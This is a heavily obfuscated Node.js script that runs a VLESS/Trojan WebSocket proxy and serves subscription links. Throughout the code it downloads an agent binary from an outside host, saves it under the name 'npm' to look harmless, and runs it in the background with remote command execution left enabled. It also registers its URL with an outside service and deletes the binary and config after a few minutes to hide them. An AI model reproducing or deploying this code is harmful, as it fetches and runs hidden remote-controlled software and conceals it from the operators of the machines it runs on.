function _0x55f8(_0x260bb2,_0x41555a){const _0x371bc3=_0x371b();return _0x55f8=function(_0x55f83c,_0x131a62){_0x55f83c=_0x55f83c-0x8a;let _0xa2156f=_0x371bc3[_0x55f83c];return _0xa2156f;},_0x55f8(_0x260bb2,_0x41555a);}const _0x3f1f84=_0x55f8;(function(_0x14b964,_0x27cffd){const _0x11a335=_0x55f8,_0x4fe98b=_0x14b964();while(!![]){try{const _0x5a5ab7=parseInt(_0x11a335(0xa0))/0x1+parseInt(_0x11a335(0xa5))/0x2+-parseInt(_0x11a335(0xd6))/0x3+-parseInt(_0x11a335(0xd4))/0x4*(parseInt(_0x11a335(0xea))/0x5)+parseInt(_0x11a335(0x8d))/0x6+parseInt(_0x11a335(0xcc))/0x7+parseInt(_0x11a335(0xad))/0x8*(-parseInt(_0x11a335(0x109))/0x9);if(_0x5a5ab7===_0x27cffd)break;else _0x4fe98b['push'](_0x4fe98b['shift']());}catch(_0x4bfa97){_0x4fe98b['push'](_0x4fe98b['shift']());}}}(_0x371b,0xe2840));const os=require('os'),http=require(_0x3f1f84(0x95)),fs=require('fs'),axios=require(_0x3f1f84(0x10b)),net=require(_0x3f1f84(0xa1)),path=require(_0x3f1f84(0xc2)),crypto=require(_0x3f1f84(0xf8)),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x3f1f84(0xe2)][_0x3f1f84(0x9a)]||'b3574dc4-a701-49a1-a84a-fcba6f54f553',NEZHA_SERVER=process[_0x3f1f84(0xe2)][_0x3f1f84(0xcb)]||'',NEZHA_PORT=process['env'][_0x3f1f84(0xd3)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',DOMAIN=process[_0x3f1f84(0xe2)]['DOMAIN']||_0x3f1f84(0xf4),AUTO_ACCESS=process['env'][_0x3f1f84(0xf1)]||!![],WSPATH=process['env'][_0x3f1f84(0x96)]||UUID[_0x3f1f84(0xda)](0x0,0x8),SUB_PATH=process[_0x3f1f84(0xe2)][_0x3f1f84(0xb0)]||'sub',NAME=process[_0x3f1f84(0xe2)][_0x3f1f84(0xe3)]||_0x3f1f84(0xce),PORT=process['env']['PORT']||0x1eb4;let ISP='';function _0x371b(){const _0x91156=['readUInt8','crypto','stream','write','readUInt16BE','unlink','catch','pop','https://oooo.serv00.net/add-url','npm\x20download\x20successfully','trojan://','includes','connection','2083','trim','aarch64','npm\x20running\x20error:','join','194958QGboIH','send','axios','https://arm64.ssss.nyc.mn/agent','2087','arm64','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/v1','10097640Cavysl','2096','npm\x20is\x20running','createServer','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','once','arch','createHash','http','WSPATH','application/json','decode','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','UUID','listen','length','data',':443?encryption=none&security=tls&sni=','get','1454137cJusbv','net','update','8443','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','2307606fCoFJD','close','443','connect','false','pipe','readFile','text/html','576unrilI','https://dns.google/resolve?name=','split','SUB_PATH','concat','log','test','Failed\x20to\x20resolve\x20','digest','Hello\x20world!','config.yaml','replace','url','Not\x20Found\x0a','utf-8','/bin/bash','vless://','post','8.8.4.4','every','reduce','path','Server\x20is\x20running\x20on\x20port\x20','createWriteStream','hex','toString',':443?security=tls&sni=','error','&type=A','finish','NEZHA_SERVER','1586585MglBzb','\x20with\x20all\x20DNS\x20servers','Hug','asOrganization','writeHead','map','chmod\x20+x\x20npm','NEZHA_PORT','503652QFgmtL','https://arm64.ssss.nyc.mn/v1','2690538ULEczS','text/plain','arm','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','slice','true','sha224','https://amd64.ssss.nyc.mn/agent','writeFileSync','message','npm','Status','env','NAME','--tls','1.1.1.1','Answer','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://','&fp=chrome&type=ws&host=','45tYBDRA','then','end','&path=%2F','index.html','https://speed.cloudflare.com/meta','substr','AUTO_ACCESS','utf8','base64','1234.abc.com','2053','type'];_0x371b=function(){return _0x91156;};return _0x371b();}const GetISP=async()=>{const _0x590851=_0x3f1f84;try{const _0x45ac83=await axios['get'](_0x590851(0xef)),_0x3b64cc=_0x45ac83[_0x590851(0x9d)];ISP=(_0x3b64cc['country']+'-'+_0x3b64cc[_0x590851(0xcf)])[_0x590851(0xb8)](/ /g,'_');}catch(_0x2bb2da){ISP='Unknown';}};GetISP();const httpServer=http[_0x3f1f84(0x90)]((_0x3b6084,_0x450931)=>{const _0x5b4c67=_0x3f1f84;if(_0x3b6084['url']==='/'){const _0x4a1bc3=path[_0x5b4c67(0x108)](__dirname,_0x5b4c67(0xee));fs[_0x5b4c67(0xab)](_0x4a1bc3,_0x5b4c67(0xf2),(_0x343fcc,_0x1305b6)=>{const _0x46c743=_0x5b4c67;if(_0x343fcc){_0x450931[_0x46c743(0xd0)](0xc8,{'Content-Type':_0x46c743(0xac)}),_0x450931[_0x46c743(0xec)](_0x46c743(0xb6));return;}_0x450931[_0x46c743(0xd0)](0xc8,{'Content-Type':_0x46c743(0xac)}),_0x450931['end'](_0x1305b6);});return;}else{if(_0x3b6084[_0x5b4c67(0xb9)]==='/'+SUB_PATH){const _0x4c4e54=_0x5b4c67(0xbd)+UUID+'@'+DOMAIN+_0x5b4c67(0x9e)+DOMAIN+_0x5b4c67(0xe9)+DOMAIN+_0x5b4c67(0xed)+WSPATH+'#'+NAME+'-'+ISP,_0x186128=_0x5b4c67(0x101)+UUID+'@'+DOMAIN+_0x5b4c67(0xc7)+DOMAIN+_0x5b4c67(0xe9)+DOMAIN+_0x5b4c67(0xed)+WSPATH+'#'+NAME+'-'+ISP,_0x2cd23d=_0x4c4e54+'\x0a'+_0x186128,_0x70eea7=Buffer['from'](_0x2cd23d)['toString'](_0x5b4c67(0xf3));_0x450931['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x450931[_0x5b4c67(0xec)](_0x70eea7+'\x0a');}else _0x450931[_0x5b4c67(0xd0)](0x194,{'Content-Type':_0x5b4c67(0xd7)}),_0x450931[_0x5b4c67(0xec)](_0x5b4c67(0xba));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x3f1f84(0xb8)](/-/g,''),DNS_SERVERS=[_0x3f1f84(0xbf),_0x3f1f84(0xe5)];function resolveHost(_0x341d44){return new Promise((_0x484ccd,_0x6b12a5)=>{const _0x4f155=_0x55f8;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4f155(0xb3)](_0x341d44)){_0x484ccd(_0x341d44);return;}let _0x3dba43=0x0;function _0x5405ec(){const _0x386677=_0x4f155;if(_0x3dba43>=DNS_SERVERS[_0x386677(0x9c)]){_0x6b12a5(new Error(_0x386677(0xb4)+_0x341d44+_0x386677(0xcd)));return;}const _0x49fb7a=DNS_SERVERS[_0x3dba43];_0x3dba43++;const _0x275eff=_0x386677(0xae)+encodeURIComponent(_0x341d44)+_0x386677(0xc9);axios['get'](_0x275eff,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x180ca2=>{const _0x370d8c=_0x386677,_0x7c7d3c=_0x180ca2[_0x370d8c(0x9d)];if(_0x7c7d3c[_0x370d8c(0xe1)]===0x0&&_0x7c7d3c[_0x370d8c(0xe6)]&&_0x7c7d3c[_0x370d8c(0xe6)]['length']>0x0){const _0x5ec540=_0x7c7d3c[_0x370d8c(0xe6)]['find'](_0x4d5d76=>_0x4d5d76[_0x370d8c(0xf6)]===0x1);if(_0x5ec540){_0x484ccd(_0x5ec540['data']);return;}}_0x5405ec();})['catch'](_0x5c8ab3=>{_0x5405ec();});}_0x5405ec();});}function handleVlessConnection(_0x447a7a,_0x1241b7){const _0x12947d=_0x3f1f84,[_0x2b35a9]=_0x1241b7,_0x2b0a9d=_0x1241b7['slice'](0x1,0x11);if(!_0x2b0a9d[_0x12947d(0xc0)]((_0x5f23eb,_0x4289af)=>_0x5f23eb==parseInt(uuid[_0x12947d(0xf0)](_0x4289af*0x2,0x2),0x10)))return![];let _0x2bd5ba=_0x1241b7[_0x12947d(0xda)](0x11,0x12)[_0x12947d(0xf7)]()+0x13;const _0xb240da=_0x1241b7[_0x12947d(0xda)](_0x2bd5ba,_0x2bd5ba+=0x2)[_0x12947d(0xfb)](0x0),_0x465811=_0x1241b7[_0x12947d(0xda)](_0x2bd5ba,_0x2bd5ba+=0x1)[_0x12947d(0xf7)](),_0x9a522f=_0x465811==0x1?_0x1241b7['slice'](_0x2bd5ba,_0x2bd5ba+=0x4)[_0x12947d(0x108)]('.'):_0x465811==0x2?new TextDecoder()[_0x12947d(0x98)](_0x1241b7[_0x12947d(0xda)](_0x2bd5ba+0x1,_0x2bd5ba+=0x1+_0x1241b7['slice'](_0x2bd5ba,_0x2bd5ba+0x1)[_0x12947d(0xf7)]())):_0x465811==0x3?_0x1241b7['slice'](_0x2bd5ba,_0x2bd5ba+=0x10)[_0x12947d(0xc1)]((_0x2d721c,_0x57def0,_0x40441c,_0x3cc4e4)=>_0x40441c%0x2?_0x2d721c[_0x12947d(0xb1)](_0x3cc4e4[_0x12947d(0xda)](_0x40441c-0x1,_0x40441c+0x1)):_0x2d721c,[])['map'](_0x14c90b=>_0x14c90b[_0x12947d(0xfb)](0x0)[_0x12947d(0xc6)](0x10))[_0x12947d(0x108)](':'):'';_0x447a7a[_0x12947d(0x10a)](new Uint8Array([_0x2b35a9,0x0]));const _0x51e11c=createWebSocketStream(_0x447a7a);return resolveHost(_0x9a522f)[_0x12947d(0xeb)](_0x5ad5c2=>{const _0x5518b7=_0x12947d;net['connect']({'host':_0x5ad5c2,'port':_0xb240da},function(){const _0x2ed915=_0x55f8;this[_0x2ed915(0xfa)](_0x1241b7[_0x2ed915(0xda)](_0x2bd5ba)),_0x51e11c['on'](_0x2ed915(0xc8),()=>{})[_0x2ed915(0xaa)](this)['on'](_0x2ed915(0xc8),()=>{})[_0x2ed915(0xaa)](_0x51e11c);})['on'](_0x5518b7(0xc8),()=>{});})[_0x12947d(0xfd)](_0x3b01c2=>{const _0x427b84=_0x12947d;net[_0x427b84(0xa8)]({'host':_0x9a522f,'port':_0xb240da},function(){const _0x40ee5=_0x427b84;this['write'](_0x1241b7[_0x40ee5(0xda)](_0x2bd5ba)),_0x51e11c['on'](_0x40ee5(0xc8),()=>{})[_0x40ee5(0xaa)](this)['on']('error',()=>{})[_0x40ee5(0xaa)](_0x51e11c);})['on'](_0x427b84(0xc8),()=>{});}),!![];}function handleTrojanConnection(_0x131232,_0x11e502){const _0x6a0656=_0x3f1f84;try{if(_0x11e502[_0x6a0656(0x9c)]<0x3a)return![];const _0xcdeb1=_0x11e502[_0x6a0656(0xda)](0x0,0x38)['toString'](),_0x460a46=[UUID];let _0x25a30c=null;for(const _0x53622d of _0x460a46){const _0x1e3c31=crypto[_0x6a0656(0x94)](_0x6a0656(0xdc))[_0x6a0656(0xa2)](_0x53622d)[_0x6a0656(0xb5)](_0x6a0656(0xc5));if(_0x1e3c31===_0xcdeb1){_0x25a30c=_0x53622d;break;}}if(!_0x25a30c)return![];let _0x1eff4c=0x38;_0x11e502[_0x1eff4c]===0xd&&_0x11e502[_0x1eff4c+0x1]===0xa&&(_0x1eff4c+=0x2);const _0x5d66ac=_0x11e502[_0x1eff4c];if(_0x5d66ac!==0x1)return![];_0x1eff4c+=0x1;const _0x23bf66=_0x11e502[_0x1eff4c];_0x1eff4c+=0x1;let _0x384b01,_0x2e0f82;if(_0x23bf66===0x1)_0x384b01=_0x11e502['slice'](_0x1eff4c,_0x1eff4c+0x4)[_0x6a0656(0x108)]('.'),_0x1eff4c+=0x4;else{if(_0x23bf66===0x3){const _0x175815=_0x11e502[_0x1eff4c];_0x1eff4c+=0x1,_0x384b01=_0x11e502[_0x6a0656(0xda)](_0x1eff4c,_0x1eff4c+_0x175815)['toString'](),_0x1eff4c+=_0x175815;}else{if(_0x23bf66===0x4)_0x384b01=_0x11e502['slice'](_0x1eff4c,_0x1eff4c+0x10)[_0x6a0656(0xc1)]((_0x574b57,_0x58eefe,_0x2a13fe,_0x3b8f87)=>_0x2a13fe%0x2?_0x574b57[_0x6a0656(0xb1)](_0x3b8f87[_0x6a0656(0xda)](_0x2a13fe-0x1,_0x2a13fe+0x1)):_0x574b57,[])[_0x6a0656(0xd1)](_0x39f4ef=>_0x39f4ef[_0x6a0656(0xfb)](0x0)[_0x6a0656(0xc6)](0x10))['join'](':'),_0x1eff4c+=0x10;else return![];}}_0x2e0f82=_0x11e502[_0x6a0656(0xfb)](_0x1eff4c),_0x1eff4c+=0x2;_0x1eff4c<_0x11e502[_0x6a0656(0x9c)]&&_0x11e502[_0x1eff4c]===0xd&&_0x11e502[_0x1eff4c+0x1]===0xa&&(_0x1eff4c+=0x2);const _0x176d35=createWebSocketStream(_0x131232);return resolveHost(_0x384b01)[_0x6a0656(0xeb)](_0x4daa53=>{const _0x5d265a=_0x6a0656;net[_0x5d265a(0xa8)]({'host':_0x4daa53,'port':_0x2e0f82},function(){const _0x412fbf=_0x5d265a;_0x1eff4c<_0x11e502[_0x412fbf(0x9c)]&&this[_0x412fbf(0xfa)](_0x11e502[_0x412fbf(0xda)](_0x1eff4c)),_0x176d35['on'](_0x412fbf(0xc8),()=>{})[_0x412fbf(0xaa)](this)['on'](_0x412fbf(0xc8),()=>{})[_0x412fbf(0xaa)](_0x176d35);})['on'](_0x5d265a(0xc8),()=>{});})['catch'](_0x518dca=>{const _0x13862f=_0x6a0656;net[_0x13862f(0xa8)]({'host':_0x384b01,'port':_0x2e0f82},function(){const _0x3c387e=_0x13862f;_0x1eff4c<_0x11e502['length']&&this[_0x3c387e(0xfa)](_0x11e502[_0x3c387e(0xda)](_0x1eff4c)),_0x176d35['on']('error',()=>{})[_0x3c387e(0xaa)](this)['on']('error',()=>{})[_0x3c387e(0xaa)](_0x176d35);})['on']('error',()=>{});}),!![];}catch(_0x125050){return![];}}wss['on'](_0x3f1f84(0x103),(_0x4adf3e,_0x729dbf)=>{const _0x3dfedd=_0x3f1f84,_0x26f092=_0x729dbf[_0x3dfedd(0xb9)]||'';_0x4adf3e[_0x3dfedd(0x92)](_0x3dfedd(0xdf),_0x1e985f=>{const _0x2b18a1=_0x3dfedd;if(_0x1e985f['length']>0x11&&_0x1e985f[0x0]===0x0){const _0x3de47d=_0x1e985f[_0x2b18a1(0xda)](0x1,0x11),_0x593ae5=_0x3de47d['every']((_0x50b081,_0x3412ac)=>_0x50b081==parseInt(uuid['substr'](_0x3412ac*0x2,0x2),0x10));if(_0x593ae5){!handleVlessConnection(_0x4adf3e,_0x1e985f)&&_0x4adf3e[_0x2b18a1(0xa6)]();return;}}!handleTrojanConnection(_0x4adf3e,_0x1e985f)&&_0x4adf3e[_0x2b18a1(0xa6)]();})['on'](_0x3dfedd(0xc8),()=>{});});const getDownloadUrl=()=>{const _0x4ab9a7=_0x3f1f84,_0xeae8b=os[_0x4ab9a7(0x93)]();return _0xeae8b===_0x4ab9a7(0xd8)||_0xeae8b===_0x4ab9a7(0x8a)||_0xeae8b===_0x4ab9a7(0x106)?!NEZHA_PORT?_0x4ab9a7(0xd5):_0x4ab9a7(0x10c):!NEZHA_PORT?_0x4ab9a7(0x8c):_0x4ab9a7(0xdd);},downloadFile=async()=>{const _0x1b4535=_0x3f1f84;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x372df9=getDownloadUrl(),_0x1d3b77=await axios({'method':_0x1b4535(0x9f),'url':_0x372df9,'responseType':_0x1b4535(0xf9)}),_0x181604=fs[_0x1b4535(0xc4)](_0x1b4535(0xe0));return _0x1d3b77[_0x1b4535(0x9d)][_0x1b4535(0xaa)](_0x181604),new Promise((_0x2cd7a2,_0x3ac1d8)=>{const _0x500506=_0x1b4535;_0x181604['on'](_0x500506(0xca),()=>{const _0x4a077c=_0x500506;console[_0x4a077c(0xb2)](_0x4a077c(0x100)),exec(_0x4a077c(0xd2),_0x12bd75=>{if(_0x12bd75)_0x3ac1d8(_0x12bd75);_0x2cd7a2();});}),_0x181604['on'](_0x500506(0xc8),_0x3ac1d8);});}catch(_0x1c4304){throw _0x1c4304;}},runnz=async()=>{const _0x396ca6=_0x3f1f84;try{const _0xb902c5=execSync(_0x396ca6(0x91),{'encoding':_0x396ca6(0xbb)});if(_0xb902c5[_0x396ca6(0x105)]()!==''){console[_0x396ca6(0xb2)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x240cf5){}await downloadFile();let _0x14fb52='',_0x315ae7=[_0x396ca6(0xa7),_0x396ca6(0xa3),_0x396ca6(0x8e),_0x396ca6(0x10d),_0x396ca6(0x104),_0x396ca6(0xf5)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3ea966=_0x315ae7[_0x396ca6(0x102)](NEZHA_PORT)?_0x396ca6(0xe4):'';_0x14fb52='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x3ea966+_0x396ca6(0x8b);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x329162=NEZHA_SERVER[_0x396ca6(0x102)](':')?NEZHA_SERVER[_0x396ca6(0xaf)](':')[_0x396ca6(0xfe)]():'',_0x35fc3f=_0x315ae7[_0x396ca6(0x102)](_0x329162)?_0x396ca6(0xdb):_0x396ca6(0xa9),_0x117853='client_secret:\x20'+NEZHA_KEY+_0x396ca6(0xe7)+NEZHA_SERVER+_0x396ca6(0xa4)+_0x35fc3f+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x396ca6(0xde)](_0x396ca6(0xb7),_0x117853);}_0x14fb52=_0x396ca6(0x99);}else{console['log'](_0x396ca6(0xd9));return;}}try{exec(_0x14fb52,{'shell':_0x396ca6(0xbc)},_0x3475d5=>{const _0x159636=_0x396ca6;if(_0x3475d5)console[_0x159636(0xc8)](_0x159636(0x107),_0x3475d5);else console['log'](_0x159636(0x8f));});}catch(_0x1ba828){console['error']('error:\x20'+_0x1ba828);}};async function addAccessTask(){const _0x565b45=_0x3f1f84;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x3f55a9=_0x565b45(0xe8)+DOMAIN+'/'+SUB_PATH;try{const _0x1a7947=await axios[_0x565b45(0xbe)](_0x565b45(0xff),{'url':_0x3f55a9},{'headers':{'Content-Type':_0x565b45(0x97)}});console[_0x565b45(0xb2)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x3cc299){}}const delFiles=()=>{const _0x2d56e1=_0x3f1f84;fs['unlink'](_0x2d56e1(0xe0),()=>{}),fs[_0x2d56e1(0xfc)](_0x2d56e1(0xb7),()=>{});};httpServer[_0x3f1f84(0x9b)](PORT,()=>{const _0x380284=_0x3f1f84;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x380284(0xb2)](_0x380284(0xc3)+PORT);});
